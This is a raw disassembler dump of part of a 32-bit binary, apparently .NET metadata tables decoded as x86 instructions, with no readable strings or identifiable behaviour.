  404de9:	00 91 00 6c 12 f7    	add    %dl,-0x8ed9400(%ecx)
  404def:	00 04 00             	add    %al,(%eax,%eax,1)
  404df2:	e8 27 00 00 00       	call   0x404e1e
  404df7:	00 91 00 a3 09 d4    	add    %dl,-0x2bf65d00(%ecx)
  404dfd:	00 04 00             	add    %al,(%eax,%eax,1)
  404e00:	48                   	dec    %eax
  404e01:	28 00                	sub    %al,(%eax)
  404e03:	00 00                	add    %al,(%eax)
  404e05:	00 91 00 53 03 ad    	add    %dl,-0x52fcad00(%ecx)
  404e0b:	06                   	push   %es
  404e0c:	05 00 9c 28 00       	add    $0x289c00,%eax
  404e11:	00 00                	add    %al,(%eax)
  404e13:	00 91 00 7b 03 b9    	add    %dl,-0x46fc8500(%ecx)
  404e19:	06                   	push   %es
  404e1a:	08 00                	or     %al,(%eax)
  404e1c:	e8 28 00 00 00       	call   0x404e49
  404e21:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404e27:	02 0a                	add    (%edx),%cl
  404e29:	00 53 29             	add    %dl,0x29(%ebx)
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	96                   	xchg   %eax,%esi
  404e31:	00 26                	add    %ah,(%esi)
  404e33:	14 e9                	adc    $0xe9,%al
  404e35:	02 0a                	add    (%edx),%cl
  404e37:	00 88 29 00 00 00    	add    %cl,0x29(%eax)
  404e3d:	00 91 00 29 06 f7    	add    %dl,-0x8f9d700(%ecx)
  404e43:	00 0a                	add    %cl,(%edx)
  404e45:	00 e8                	add    %ch,%al
  404e47:	29 00                	sub    %eax,(%eax)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	00 91 00 55 05 19    	add    %dl,0x19055500(%ecx)
  404e51:	01 0a                	add    %ecx,(%edx)
  404e53:	00 30                	add    %dh,(%eax)
  404e55:	2a 00                	sub    (%eax),%al
  404e57:	00 00                	add    %al,(%eax)
  404e59:	00 91 00 64 14 19    	add    %dl,0x19146400(%ecx)
  404e5f:	01 0b                	add    %ecx,(%ebx)
  404e61:	00 8c 2a 00 00 00 00 	add    %cl,0x0(%edx,%ebp,1)
  404e68:	91                   	xchg   %eax,%ecx
  404e69:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404e6c:	19 01                	sbb    %eax,(%ecx)
  404e6e:	0c 00                	or     $0x0,%al
  404e70:	10 2b                	adc    %ch,(%ebx)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	00 00                	add    %al,(%eax)
  404e76:	91                   	xchg   %eax,%ecx
  404e77:	00 2a                	add    %ch,(%edx)
  404e79:	10 19                	adc    %bl,(%ecx)
  404e7b:	01 0d 00 ac 2b 00    	add    %ecx,0x2bac00
  404e81:	00 00                	add    %al,(%eax)
  404e83:	00 91 00 3a 0f 2d    	add    %dl,0x2d0f3a00(%ecx)
  404e89:	00 0e                	add    %cl,(%esi)
  404e8b:	00 e8                	add    %ch,%al
  404e8d:	2b 00                	sub    (%eax),%eax
  404e8f:	00 00                	add    %al,(%eax)
  404e91:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404e97:	02 0e                	add    (%esi),%cl
  404e99:	00 28                	add    %ch,(%eax)
  404e9b:	2c 00                	sub    $0x0,%al
  404e9d:	00 00                	add    %al,(%eax)
  404e9f:	00 91 00 46 0c e9    	add    %dl,-0x16f3ba00(%ecx)
  404ea5:	02 0e                	add    (%esi),%cl
  404ea7:	00 98 2c 00 00 00    	add    %bl,0x2c(%eax)
  404ead:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404eb3:	02 0e                	add    (%esi),%cl
  404eb5:	00 a4 2c 00 00 00 00 	add    %ah,0x0(%esp,%ebp,1)
  404ebc:	96                   	xchg   %eax,%esi
  404ebd:	00 11                	add    %dl,(%ecx)
  404ebf:	04 e9                	add    $0xe9,%al
  404ec1:	02 0e                	add    (%esi),%cl
  404ec3:	00 70 2d             	add    %dh,0x2d(%eax)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	00 00                	add    %al,(%eax)
  404eca:	91                   	xchg   %eax,%ecx
  404ecb:	00 7b 0b             	add    %bh,0xb(%ebx)
  404ece:	c0 06 0e             	rolb   $0xe,(%esi)
  404ed1:	00 a4 2d 00 00 00 00 	add    %ah,0x0(%ebp,%ebp,1)
  404ed8:	91                   	xchg   %eax,%ecx
  404ed9:	18 50 0f             	sbb    %dl,0xf(%eax)
  404edc:	e9 02 10 00 f8       	jmp    0xf8405ee3
  404ee1:	2d 00 00 00 00       	sub    $0x0,%eax
  404ee6:	96                   	xchg   %eax,%esi
  404ee7:	00 ec                	add    %ch,%ah
  404ee9:	12 e9                	adc    %cl,%ch
  404eeb:	02 10                	add    (%eax),%dl
  404eed:	00 4c 2e 00          	add    %cl,0x0(%esi,%ebp,1)
  404ef1:	00 00                	add    %al,(%eax)
  404ef3:	00 96 00 a1 0d e9    	add    %dl,-0x16f25f00(%esi)
  404ef9:	02 10                	add    (%eax),%dl
  404efb:	00 70 2e             	add    %dh,0x2e(%eax)
  404efe:	00 00                	add    %al,(%eax)
  404f00:	00 00                	add    %al,(%eax)
  404f02:	91                   	xchg   %eax,%ecx
  404f03:	00 63 03             	add    %ah,0x3(%ebx)
  404f06:	a8 06                	test   $0x6,%al
  404f08:	10 00                	adc    %al,(%eax)
  404f0a:	ac                   	lods   %ds:(%esi),%al
  404f0b:	2e 00 00             	add    %al,%cs:(%eax)
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	91                   	xchg   %eax,%ecx
  404f11:	00 6a 07             	add    %ch,0x7(%edx)
  404f14:	19 01                	sbb    %eax,(%ecx)
  404f16:	10 00                	adc    %al,(%eax)
  404f18:	e0 2e                	loopne 0x404f48
  404f1a:	00 00                	add    %al,(%eax)
  404f1c:	00 00                	add    %al,(%eax)
  404f1e:	91                   	xchg   %eax,%ecx
  404f1f:	18 50 0f             	sbb    %dl,0xf(%eax)
  404f22:	e9 02 11 00 f4       	jmp    0xf4406029
  404f27:	2e 00 00             	add    %al,%cs:(%eax)
  404f2a:	00 00                	add    %al,(%eax)
  404f2c:	96                   	xchg   %eax,%esi
  404f2d:	00 ec                	add    %ch,%ah
  404f2f:	09 e9                	or     %ebp,%ecx
  404f31:	02 11                	add    (%ecx),%dl
  404f33:	00 42 2f             	add    %al,0x2f(%edx)
  404f36:	00 00                	add    %al,(%eax)
  404f38:	00 00                	add    %al,(%eax)
  404f3a:	96                   	xchg   %eax,%esi
  404f3b:	00 de                	add    %bl,%dh
  404f3d:	09 e9                	or     %ebp,%ecx
  404f3f:	02 11                	add    (%ecx),%dl
  404f41:	00 68 2f             	add    %ch,0x2f(%eax)
  404f44:	00 00                	add    %al,(%eax)
  404f46:	00 00                	add    %al,(%eax)
  404f48:	91                   	xchg   %eax,%ecx
  404f49:	00 43 03             	add    %al,0x3(%ebx)
  404f4c:	a8 06                	test   $0x6,%al
  404f4e:	11 00                	adc    %eax,(%eax)
  404f50:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404f51:	2f                   	das
  404f52:	00 00                	add    %al,(%eax)
  404f54:	00 00                	add    %al,(%eax)
  404f56:	91                   	xchg   %eax,%ecx
  404f57:	00 12                	add    %dl,(%edx)
  404f59:	06                   	push   %es
  404f5a:	c6 06 11             	movb   $0x11,(%esi)
  404f5d:	00 18                	add    %bl,(%eax)
  404f5f:	30 00                	xor    %al,(%eax)
  404f61:	00 00                	add    %al,(%eax)
  404f63:	00 91 00 66 07 19    	add    %dl,0x19076600(%ecx)
  404f69:	01 12                	add    %edx,(%edx)
  404f6b:	00 4c 30 00          	add    %cl,0x0(%eax,%esi,1)
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404f77:	02 13                	add    (%ebx),%dl
  404f79:	00 a8 30 00 00 00    	add    %ch,0x30(%eax)
  404f7f:	00 96 00 06 04 e9    	add    %dl,-0x16fbfa00(%esi)
  404f85:	02 13                	add    (%ebx),%dl
  404f87:	00 78 31             	add    %bh,0x31(%eax)
  404f8a:	00 00                	add    %al,(%eax)
  404f8c:	00 00                	add    %al,(%eax)
  404f8e:	91                   	xchg   %eax,%ecx
  404f8f:	00 1b                	add    %bl,(%ebx)
  404f91:	13 cb                	adc    %ebx,%ecx
  404f93:	06                   	push   %es
  404f94:	13 00                	adc    (%eax),%eax
  404f96:	48                   	dec    %eax
  404f97:	32 00                	xor    (%eax),%al
  404f99:	00 00                	add    %al,(%eax)
  404f9b:	00 86 18 4a 0f 06    	add    %al,0x60f4a18(%esi)
  404fa1:	00 16                	add    %dl,(%esi)
  404fa3:	00 50 32             	add    %dl,0x32(%eax)
  404fa6:	00 00                	add    %al,(%eax)
  404fa8:	00 00                	add    %al,(%eax)
  404faa:	83 00 fd             	addl   $0xfffffffd,(%eax)
  404fad:	00 54 00 16          	add    %dl,0x16(%eax,%eax,1)
  404fb1:	00 5e 32             	add    %bl,0x32(%esi)
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	00 00                	add    %al,(%eax)
  404fb8:	91                   	xchg   %eax,%ecx
  404fb9:	18 50 0f             	sbb    %dl,0xf(%eax)
  404fbc:	e9 02 17 00 6a       	jmp    0x6a4066c3
  404fc1:	32 00                	xor    (%eax),%al
  404fc3:	00 00                	add    %al,(%eax)
  404fc5:	00 86 18 4a 0f 06    	add    %al,0x60f4a18(%esi)
  404fcb:	00 17                	add    %dl,(%edi)
  404fcd:	00 72 32             	add    %dh,0x32(%edx)
  404fd0:	00 00                	add    %al,(%eax)
  404fd2:	00 00                	add    %al,(%eax)
  404fd4:	83 00 6c             	addl   $0x6c,(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	00 17                	add    %dl,(%edi)
  404fdb:	00 79 32             	add    %bh,0x32(%ecx)
  404fde:	00 00                	add    %al,(%eax)
  404fe0:	00 00                	add    %al,(%eax)
  404fe2:	86 18                	xchg   %bl,(%eax)
  404fe4:	4a                   	dec    %edx
  404fe5:	0f 06                	clts
  404fe7:	00 17                	add    %dl,(%edi)
  404fe9:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  404ff0:	83 00 d7             	addl   $0xffffffd7,(%eax)
  404ff3:	00 06                	add    %al,(%esi)
  404ff5:	00 17                	add    %dl,(%edi)
  404ff7:	00 14 34             	add    %dl,(%esp,%esi,1)
  404ffa:	00 00                	add    %al,(%eax)
  404ffc:	00 00                	add    %al,(%eax)
  404ffe:	86 18                	xchg   %bl,(%eax)
  405000:	4a                   	dec    %edx
  405001:	0f 06                	clts
  405003:	00 17                	add    %dl,(%edi)
  405005:	00 1c 34             	add    %bl,(%esp,%esi,1)
  405008:	00 00                	add    %al,(%eax)
  40500a:	00 00                	add    %al,(%eax)
  40500c:	86 18                	xchg   %bl,(%eax)
  40500e:	4a                   	dec    %edx
  40500f:	0f 06                	clts
  405011:	00 17                	add    %dl,(%edi)
  405013:	00 24 34             	add    %ah,(%esp,%esi,1)
  405016:	00 00                	add    %al,(%eax)
  405018:	00 00                	add    %al,(%eax)
  40501a:	83 00 38             	addl   $0x38,(%eax)
  40501d:	01 36                	add    %esi,(%esi)
  40501f:	01 17                	add    %edx,(%edi)
  405021:	00 68 34             	add    %ch,0x34(%eax)
  405024:	00 00                	add    %al,(%eax)
  405026:	00 00                	add    %al,(%eax)
  405028:	e1 01                	loope  0x40502b
  40502a:	84 13                	test   %dl,(%ebx)
  40502c:	06                   	push   %es
  40502d:	00 17                	add    %dl,(%edi)
  40502f:	00 b0 35 00 00 00    	add    %dh,0x35(%eax)
  405035:	00 e1                	add    %ah,%cl
  405037:	01 d1                	add    %edx,%ecx
  405039:	06                   	push   %es
  40503a:	26 00 17             	add    %dl,%es:(%edi)
  40503d:	00 c0                	add    %al,%al
  40503f:	35 00 00 00 00       	xor    $0x0,%eax
  405044:	e1 01                	loope  0x405047
  405046:	84 13                	test   %dl,(%ebx)
  405048:	06                   	push   %es
  405049:	00 18                	add    %bl,(%eax)
  40504b:	00 48 38             	add    %cl,0x38(%eax)
  40504e:	00 00                	add    %al,(%eax)
  405050:	00 00                	add    %al,(%eax)
  405052:	e1 01                	loope  0x405055
  405054:	d1 06                	roll   $1,(%esi)
  405056:	26 00 18             	add    %bl,%es:(%eax)
  405059:	00 58 38             	add    %bl,0x38(%eax)
  40505c:	00 00                	add    %al,(%eax)
  40505e:	00 00                	add    %al,(%eax)
  405060:	e1 01                	loope  0x405063
  405062:	84 13                	test   %dl,(%ebx)
  405064:	06                   	push   %es
  405065:	00 19                	add    %bl,(%ecx)
  405067:	00 2c 39             	add    %ch,(%ecx,%edi,1)
  40506a:	00 00                	add    %al,(%eax)
  40506c:	00 00                	add    %al,(%eax)
  40506e:	e1 01                	loope  0x405071
  405070:	d1 06                	roll   $1,(%esi)
  405072:	26 00 19             	add    %bl,%es:(%ecx)
  405075:	00 3a                	add    %bh,(%edx)
  405077:	39 00                	cmp    %eax,(%eax)
  405079:	00 00                	add    %al,(%eax)
  40507b:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  405081:	02 1a                	add    (%edx),%bl
  405083:	00 46 39             	add    %al,0x39(%esi)
  405086:	00 00                	add    %al,(%eax)
  405088:	00 00                	add    %al,(%eax)
  40508a:	86 18                	xchg   %bl,(%eax)
  40508c:	4a                   	dec    %edx
  40508d:	0f 06                	clts
  40508f:	00 1a                	add    %bl,(%edx)
  405091:	00 50 39             	add    %dl,0x39(%eax)
  405094:	00 00                	add    %al,(%eax)
  405096:	00 00                	add    %al,(%eax)
  405098:	83 00 55             	addl   $0x55,(%eax)
  40509b:	00 06                	add    %al,(%esi)
  40509d:	00 1a                	add    %bl,(%edx)
  40509f:	00 d4                	add    %dl,%ah
  4050a1:	39 00                	cmp    %eax,(%eax)
  4050a3:	00 00                	add    %al,(%eax)
  4050a5:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  4050ab:	02 1a                	add    (%edx),%bl
  4050ad:	00 e0                	add    %ah,%al
  4050af:	39 00                	cmp    %eax,(%eax)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	00 86 18 4a 0f 06    	add    %al,0x60f4a18(%esi)
  4050b9:	00 1a                	add    %bl,(%edx)
  4050bb:	00 e8                	add    %ch,%al
  4050bd:	39 00                	cmp    %eax,(%eax)
  4050bf:	00 00                	add    %al,(%eax)
  4050c1:	00 83 00 47 00 36    	add    %al,0x36004700(%ebx)
  4050c7:	01 1a                	add    %ebx,(%edx)
  4050c9:	00 24 3a             	add    %ah,(%edx,%edi,1)
  4050cc:	00 00                	add    %al,(%eax)
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	e1 01                	loope  0x4050d3
  4050d2:	84 13                	test   %dl,(%ebx)
  4050d4:	06                   	push   %es
  4050d5:	00 1a                	add    %bl,(%edx)
  4050d7:	00 b0 3b 00 00 00    	add    %dh,0x3b(%eax)
  4050dd:	00 e1                	add    %ah,%cl
  4050df:	01 d1                	add    %edx,%ecx
  4050e1:	06                   	push   %es
  4050e2:	26 00 1a             	add    %bl,%es:(%edx)
  4050e5:	00 be 3b 00 00 00    	add    %bh,0x3b(%esi)
  4050eb:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  4050f1:	02 1b                	add    (%ebx),%bl
  4050f3:	00 ca                	add    %cl,%dl
  4050f5:	3b 00                	cmp    (%eax),%eax
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	00 86 18 4a 0f 06    	add    %al,0x60f4a18(%esi)
  4050ff:	00 1b                	add    %bl,(%ebx)
  405101:	00 d4                	add    %dl,%ah
  405103:	3b 00                	cmp    (%eax),%eax
  405105:	00 00                	add    %al,(%eax)
  405107:	00 83 00 80 00 36    	add    %al,0x36008000(%ebx)
  40510d:	01 1b                	add    %ebx,(%ebx)
  40510f:	00 0f                	add    %cl,(%edi)
  405111:	3c 00                	cmp    $0x0,%al
  405113:	00 00                	add    %al,(%eax)
  405115:	00 86 18 4a 0f 06    	add    %al,0x60f4a18(%esi)
  40511b:	00 1b                	add    %bl,(%ebx)
  40511d:	00 17                	add    %dl,(%edi)
  40511f:	3c 00                	cmp    $0x0,%al
  405121:	00 00                	add    %al,(%eax)
  405123:	00 83 00 c1 00 06    	add    %al,0x600c100(%ebx)
  405129:	00 1b                	add    %bl,(%ebx)
  40512b:	00 2c 3c             	add    %ch,(%esp,%edi,1)
  40512e:	00 00                	add    %al,(%eax)
  405130:	00 00                	add    %al,(%eax)
  405132:	e1 01                	loope  0x405135
  405134:	84 13                	test   %dl,(%ebx)
  405136:	06                   	push   %es
  405137:	00 1b                	add    %bl,(%ebx)
  405139:	00 f4                	add    %dh,%ah
  40513b:	3d 00 00 00 00       	cmp    $0x0,%eax
  405140:	e1 01                	loope  0x405143
  405142:	d1 06                	roll   $1,(%esi)
  405144:	26 00 1b             	add    %bl,%es:(%ebx)
  405147:	00 04 3e             	add    %al,(%esi,%edi,1)
  40514a:	00 00                	add    %al,(%eax)
  40514c:	00 00                	add    %al,(%eax)
  40514e:	e1 01                	loope  0x405151
  405150:	84 13                	test   %dl,(%ebx)
  405152:	06                   	push   %es
  405153:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405156:	b8 41 00 00 00       	mov    $0x41,%eax
  40515b:	00 e1                	add    %ah,%cl
  40515d:	01 d1                	add    %edx,%ecx
  40515f:	06                   	push   %es
  405160:	26 00 1c 00          	add    %bl,%es:(%eax,%eax,1)
  405164:	c8 41 00 00          	enter  $0x41,$0x0
  405168:	00 00                	add    %al,(%eax)
  40516a:	e1 01                	loope  0x40516d
  40516c:	84 13                	test   %dl,(%ebx)
  40516e:	06                   	push   %es
  40516f:	00 1d 00 80 44 00    	add    %bl,0x448000
  405175:	00 00                	add    %al,(%eax)
  405177:	00 e1                	add    %ah,%cl
  405179:	01 d1                	add    %edx,%ecx
  40517b:	06                   	push   %es
  40517c:	26 00 1d 00 90 44 00 	add    %bl,%es:0x449000
  405183:	00 00                	add    %al,(%eax)
  405185:	00 e1                	add    %ah,%cl
  405187:	01 84 13 06 00 1e 00 	add    %eax,0x1e0006(%ebx,%edx,1)
  40518e:	1c 46                	sbb    $0x46,%al
  405190:	00 00                	add    %al,(%eax)
  405192:	00 00                	add    %al,(%eax)
  405194:	e1 01                	loope  0x405197
  405196:	d1 06                	roll   $1,(%esi)
  405198:	26 00 1e             	add    %bl,%es:(%esi)
  40519b:	00 00                	add    %al,(%eax)
  40519d:	00 01                	add    %al,(%ecx)
  40519f:	00 e1                	add    %ah,%cl
  4051a1:	0a 00                	or     (%eax),%al
  4051a3:	00 02                	add    %al,(%edx)
  4051a5:	00 af 09 00 00 01    	add    %ch,0x1000009(%edi)
  4051ab:	00 d3                	add    %dl,%bl
  4051ad:	04 00                	add    $0x0,%al
  4051af:	00 01                	add    %al,(%ecx)
  4051b1:	00 9e 0d 00 00 01    	add    %bl,0x100000d(%esi)
  4051b7:	00 16                	add    %dl,(%esi)
  4051b9:	13 00                	adc    (%eax),%eax
  4051bb:	00 02                	add    %al,(%edx)
  4051bd:	00 01                	add    %al,(%ecx)
  4051bf:	13 00                	adc    (%eax),%eax
  4051c1:	00 03                	add    %al,(%ebx)
  4051c3:	00 4e 13             	add    %cl,0x13(%esi)
  4051c6:	00 00                	add    %al,(%eax)
  4051c8:	01 00                	add    %eax,(%eax)
  4051ca:	9e                   	sahf
  4051cb:	0d 00 00 02 00       	or     $0x20000,%eax
  4051d0:	9c                   	pushf
  4051d1:	0a 00                	or     (%eax),%al
  4051d3:	00 01                	add    %al,(%ecx)
  4051d5:	00 ec                	add    %ch,%ah
  4051d7:	0a 00                	or     (%eax),%al
  4051d9:	00 01                	add    %al,(%ecx)
  4051db:	00 ab 0a 00 00 01    	add    %ch,0x100000a(%ebx)
  4051e1:	00 ab 0a 00 00 01    	add    %ch,0x100000a(%ebx)
  4051e7:	00 06                	add    %al,(%esi)
  4051e9:	0b 00                	or     (%eax),%eax
  4051eb:	00 01                	add    %al,(%ecx)
  4051ed:	00 9b 01 00 00 02    	add    %bl,0x2000001(%ebx)
  4051f3:	00 10                	add    %dl,(%eax)
  4051f5:	02 00                	add    (%eax),%al
  4051f7:	00 01                	add    %al,(%ecx)
  4051f9:	00 6d 05             	add    %ch,0x5(%ebp)
  4051fc:	00 00                	add    %al,(%eax)
  4051fe:	01 00                	add    %eax,(%eax)
  405200:	1d 0b 00 00 01       	sbb    $0x100000b,%eax
  405205:	00 6d 05             	add    %ch,0x5(%ebp)
  405208:	00 00                	add    %al,(%eax)
  40520a:	01 00                	add    %eax,(%eax)
  40520c:	b3 0a                	mov    $0xa,%bl
  40520e:	00 00                	add    %al,(%eax)
  405210:	02 00                	add    (%eax),%al
  405212:	ec                   	in     (%dx),%al
  405213:	0a 00                	or     (%eax),%al
  405215:	00 03                	add    %al,(%ebx)
  405217:	00 9f 0e 00 00 01    	add    %bl,0x100000e(%edi)
  40521d:	00 3b                	add    %bh,(%ebx)
  40521f:	06                   	push   %es
  405220:	00 00                	add    %al,(%eax)
  405222:	01 00                	add    %eax,(%eax)
  405224:	e1 06                	loope  0x40522c
  405226:	00 00                	add    %al,(%eax)
  405228:	01 00                	add    %eax,(%eax)
  40522a:	e1 06                	loope  0x405232
  40522c:	00 00                	add    %al,(%eax)
  40522e:	01 00                	add    %eax,(%eax)
  405230:	e1 06                	loope  0x405238
  405232:	00 00                	add    %al,(%eax)
  405234:	01 00                	add    %eax,(%eax)
  405236:	e1 06                	loope  0x40523e
  405238:	00 00                	add    %al,(%eax)
  40523a:	01 00                	add    %eax,(%eax)
  40523c:	e1 06                	loope  0x405244
  40523e:	00 00                	add    %al,(%eax)
  405240:	01 00                	add    %eax,(%eax)
  405242:	e1 06                	loope  0x40524a
  405244:	00 00                	add    %al,(%eax)
  405246:	01 00                	add    %eax,(%eax)
  405248:	e1 06                	loope  0x405250
  40524a:	00 00                	add    %al,(%eax)
  40524c:	01 00                	add    %eax,(%eax)
  40524e:	e1 06                	loope  0x405256
  405250:	10 00                	adc    %al,(%eax)
  405252:	c1 00 11             	roll   $0x11,(%eax)
  405255:	00 c1                	add    %al,%cl
  405257:	00 12                	add    %dl,(%edx)
  405259:	00 c1                	add    %al,%cl
  40525b:	00 15 00 c1 00 18    	add    %dl,0x1800c100
  405261:	00 c1                	add    %al,%cl
  405263:	00 19                	add    %bl,(%ecx)
  405265:	00 c1                	add    %al,%cl
  405267:	00 1a                	add    %bl,(%edx)
  405269:	00 c1                	add    %al,%cl
  40526b:	00 1b                	add    %bl,(%ebx)
  40526d:	00 c1                	add    %al,%cl
  40526f:	00 09                	add    %cl,(%ecx)
  405271:	00 4a 0f             	add    %cl,0xf(%edx)
  405274:	01 00                	add    %eax,(%eax)
  405276:	11 00                	adc    %eax,(%eax)
  405278:	4a                   	dec    %edx
  405279:	0f 06                	clts
  40527b:	00 19                	add    %bl,(%ecx)
  40527d:	00 4a 0f             	add    %cl,0xf(%edx)
  405280:	0a 00                	or     (%eax),%al
  405282:	29 00                	sub    %eax,(%eax)
  405284:	4a                   	dec    %edx
  405285:	0f 10 00             	movups (%eax),%xmm0
  405288:	31 00                	xor    %eax,(%eax)
  40528a:	4a                   	dec    %edx
  40528b:	0f 10 00             	movups (%eax),%xmm0
  40528e:	39 00                	cmp    %eax,(%eax)
  405290:	4a                   	dec    %edx
  405291:	0f 10 00             	movups (%eax),%xmm0
  405294:	41                   	inc    %ecx
  405295:	00 4a 0f             	add    %cl,0xf(%edx)
  405298:	10 00                	adc    %al,(%eax)
  40529a:	49                   	dec    %ecx
  40529b:	00 4a 0f             	add    %cl,0xf(%edx)
  40529e:	10 00                	adc    %al,(%eax)
  4052a0:	51                   	push   %ecx
  4052a1:	00 4a 0f             	add    %cl,0xf(%edx)
  4052a4:	10 00                	adc    %al,(%eax)
  4052a6:	59                   	pop    %ecx
  4052a7:	00 4a 0f             	add    %cl,0xf(%edx)
  4052aa:	10 00                	adc    %al,(%eax)
  4052ac:	61                   	popa
  4052ad:	00 4a 0f             	add    %cl,0xf(%edx)
  4052b0:	15 00 69 00 4a       	adc    $0x4a006900,%eax
  4052b5:	0f 10 00             	movups (%eax),%xmm0
  4052b8:	71 00                	jno    0x4052ba
  4052ba:	4a                   	dec    %edx
  4052bb:	0f 10 00             	movups (%eax),%xmm0
  4052be:	79 00                	jns    0x4052c0
  4052c0:	4a                   	dec    %edx
  4052c1:	0f 10 00             	movups (%eax),%xmm0
  4052c4:	89 00                	mov    %eax,(%eax)
  4052c6:	4a                   	dec    %edx
  4052c7:	0f 1a 00             	bndldx (%eax),%bnd0
  4052ca:	91                   	xchg   %eax,%ecx
  4052cb:	00 4a 0f             	add    %cl,0xf(%edx)
  4052ce:	06                   	push   %es
  4052cf:	00 c9                	add    %cl,%cl
  4052d1:	00 4a 0f             	add    %cl,0xf(%edx)
  4052d4:	06                   	push   %es
  4052d5:	00 e9                	add    %ch,%cl
  4052d7:	00 4a 0f             	add    %cl,0xf(%edx)
  4052da:	20 00                	and    %al,(%eax)
  4052dc:	81 01 84 13 06 00    	addl   $0x61384,(%ecx)
  4052e2:	81 01 d1 06 26 00    	addl   $0x2606d1,(%ecx)
  4052e8:	b1 01                	mov    $0x1,%cl
  4052ea:	4a                   	dec    %edx
  4052eb:	0f 06                	clts
  4052ed:	00 d1                	add    %dl,%cl
  4052ef:	01 4a 0f             	add    %ecx,0xf(%edx)
  4052f2:	06                   	push   %es
  4052f3:	00 11                	add    %dl,(%ecx)
  4052f5:	02 3a                	add    (%edx),%bh
  4052f7:	04 2d                	add    $0x2d,%al
  4052f9:	00 11                	add    %dl,(%ecx)
  4052fb:	02 04 0a             	add    (%edx,%ecx,1),%al
  4052fe:	2d 00 a1 00 4a       	sub    $0x4a00a100,%eax
  405303:	0f 10 00             	movups (%eax),%xmm0
  405306:	a1 00 4a 12 3b       	mov    0x3b124a00,%eax
  40530b:	00 a9 00 2c 0f 40    	add    %ch,0x400f2c00(%ecx)
  405311:	00 b1 00 cf 12 45    	add    %dh,0x4512cf00(%ecx)
  405317:	00 69 01             	add    %ch,0x1(%ecx)
  40531a:	dc 0b                	fmull  (%ebx)
  40531c:	4b                   	dec    %ebx
  40531d:	00 99 00 4b 0a 50    	add    %bl,0x500a4b00(%ecx)
  405323:	00 19                	add    %bl,(%ecx)
  405325:	02 97 0e 50 00 19    	add    0x1900500e(%edi),%dl
  40532b:	02 f2                	add    %dl,%dh
  40532d:	10 54 00 b1          	adc    %dl,-0x4f(%eax,%eax,1)
  405331:	00 84 13 59 00 21 02 	add    %al,0x2210059(%ebx,%edx,1)
  405338:	45                   	inc    %ebp
  405339:	07                   	pop    %es
  40533a:	06                   	push   %es
  40533b:	00 b9 00 73 10 69    	add    %bh,0x69107300(%ecx)
  405341:	00 b9 00 50 06 50    	add    %bh,0x50065000(%ecx)
  405347:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40534a:	4a                   	dec    %edx
  40534b:	0f 77                	emms
  40534d:	00 31                	add    %dh,(%ecx)
  40534f:	02 30                	add    (%eax),%dh
  405351:	14 7d                	adc    $0x7d,%al
  405353:	00 41 02             	add    %al,0x2(%ecx)
  405356:	ee                   	out    %al,(%dx)
  405357:	06                   	push   %es
  405358:	9c                   	pushf
  405359:	00 c1                	add    %al,%cl
  40535b:	00 f3                	add    %dh,%bl
  40535d:	13 a0 00 c1 00 91    	adc    -0x6eff3f00(%eax),%esp
  405363:	09 4b 00             	or     %ecx,0x0(%ebx)
  405366:	51                   	push   %ecx
  405367:	02 a6 13 aa 00 59    	add    0x5900aa13(%esi),%ah
  40536d:	02 98 0d b0 00 51    	add    0x5100b00d(%eax),%bl
  405373:	02 a1 0d 06 00 51    	add    0x5100060d(%ecx),%ah
  405379:	02 8e 0f b5 00 b9    	add    -0x46ff4af1(%esi),%cl
  40537f:	00 c0                	add    %al,%al
  405381:	11 c3                	adc    %eax,%ebx
  405383:	00 b9 00 c5 05 c8    	add    %bh,-0x37fa3b00(%ecx)
  405389:	00 61 02             	add    %ah,0x2(%ecx)
  40538c:	05 06 50 00 69       	add    $0x69005006,%eax
  405391:	02 b6 06 ce 00 71    	add    0x7100ce06(%esi),%dh
  405397:	02 f3                	add    %bl,%dh
  405399:	11 d4                	adc    %edx,%esp
  40539b:	00 79 02             	add    %bh,0x2(%ecx)
  40539e:	d3 0a                	rorl   %cl,(%edx)
  4053a0:	dd 00                	fldl   (%eax)
  4053a2:	89 02                	mov    %eax,(%edx)
  4053a4:	f3 11 d4             	repz adc %edx,%esp
  4053a7:	00 69 02             	add    %ch,0x2(%ecx)
  4053aa:	7c 06                	jl     0x4053b2
  4053ac:	ec                   	in     (%dx),%al
  4053ad:	00 19                	add    %bl,(%ecx)
  4053af:	02 0e                	add    (%esi),%cl
  4053b1:	12 f1                	adc    %cl,%dh
  4053b3:	00 69 02             	add    %ch,0x2(%ecx)
  4053b6:	c7                   	(bad)
  4053b7:	0a f7                	or     %bh,%dh
  4053b9:	00 d1                	add    %dl,%cl
  4053bb:	00 aa 04 fb 00 d1    	add    %ch,-0x2eff04fc(%edx)
  4053c1:	00 4b 0a             	add    %cl,0xa(%ebx)
  4053c4:	00 01                	add    %al,(%ecx)
  4053c6:	19 02                	sbb    %eax,(%edx)
  4053c8:	0e                   	push   %cs
  4053c9:	12 05 01 89 02 99    	adc    0x99028901,%al
  4053cf:	13 0c 01             	adc    (%ecx,%eax,1),%ecx
  4053d2:	b9 00 ec 12 12       	mov    $0x1212ec00,%ecx
  4053d7:	01 89 02 5f 07 19    	add    %ecx,0x19075f02(%ecx)
  4053dd:	01 a9 01 4d 07 23    	add    %ebp,0x23074d01(%ecx)
